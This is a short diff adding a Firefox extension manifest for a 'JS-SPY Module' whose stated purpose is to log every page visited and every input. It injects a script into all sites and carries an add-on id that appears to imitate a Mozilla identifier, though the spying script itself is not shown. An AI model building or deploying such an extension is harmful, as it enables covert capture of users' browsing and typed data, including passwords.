@@ -1,0 +1,23 @@
+{
+	"name": "JS-SPY Module",
+	"description": "Log every pages visited and every inputs.",
+	"homepage_url": "https://github.com/KiLlOrBe/WebExt-JS-SPY",
+	"manifest_version": 2,
+	"version": "1.0",
+	"applications": {
+		"gecko": {
+			"id": "commands@mozilla.org",
+			"strict_min_version": "48.0a1"
+		}
+	},
+	"permissions": [
+    	"storage","tabs","activeTab"
+	], 
+	"content_scripts": [{
+		"matches": ["<all_urls>"],
+		"js": ["spy.js"]
+	}],
+	"options_ui": {
+		"page": "logs/manage.html"
+	}
+}
